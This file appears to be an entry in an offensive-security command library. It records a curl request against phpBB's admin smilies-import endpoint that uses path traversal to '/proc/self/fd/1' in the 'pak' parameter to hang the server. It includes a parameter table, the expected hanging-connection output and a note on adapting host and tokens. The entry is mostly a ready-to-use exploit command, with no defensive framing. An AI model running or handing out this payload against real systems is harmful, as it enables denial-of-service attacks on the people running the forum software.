---
data: >-
  curl -X POST
  "http://127.0.0.1:8082/adm/index.php?i=acp_icons&mode=smilies&current=delete"
  -H "Host: 127.0.0.1:8082" -H "Content-Type: application/x-www-form-urlencoded"
  -H "Content-Length: 137" --data
  "action=import&pak=../../../../../../../../../proc/self/fd/1&form_token=b2655d5f0c9edb201328b799a61777b26cef16a5&creation_time=1694960302"
tags:
  - dos
  - path-traversal
type: command
output: 'Request times out with no response, hanging TCP connection'
executor: bash
platforms:
  - Linux
  - Web
id: 941fdf83-e57f-4bdd-ad93-74ad87df7090
created_at: '2025-12-14T17:26:49.107Z'
updated_at: '2025-12-14T17:26:49.107Z'
verified: false
validated: true
submitted: true
---
# phpbb-import-emoji-dos

## Command

```bash
curl -X POST "http://127.0.0.1:8082/adm/index.php?i=acp_icons&mode=smilies&current=delete" -H "Host: 127.0.0.1:8082" -H "Content-Type: application/x-www-form-urlencoded" -H "Content-Length: 137" --data "action=import&pak=../../../../../../../../../proc/self/fd/1&form_token=b2655d5f0c9edb201328b799a61777b26cef16a5&creation_time=1694960302"
```

## Description

Sends a POST request to phpBB's smilies import endpoint with path traversal in 'pak' to /proc/self/fd/1, causing the file() function to hang and create a DoS by keeping the connection open.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| pak | Traversed path to hanging FD, e.g., ../../../../../../../../../proc/self/fd/1 | Yes |
| action | Set to 'import' for emoji mode | Yes |
| form_token | CSRF token from session | Yes |
| creation_time | Timestamp for request validity | Yes |

## Examples

### Basic Usage

```bash
curl ... # as above
```

### Advanced Usage

Adapt host/port and tokens for different environments.

## Expected Output

Request times out with no response, hanging TCP connection.

## Related

- [[procedures/Exploit-Path-Traversal-for-DoS-in-phpBB]]
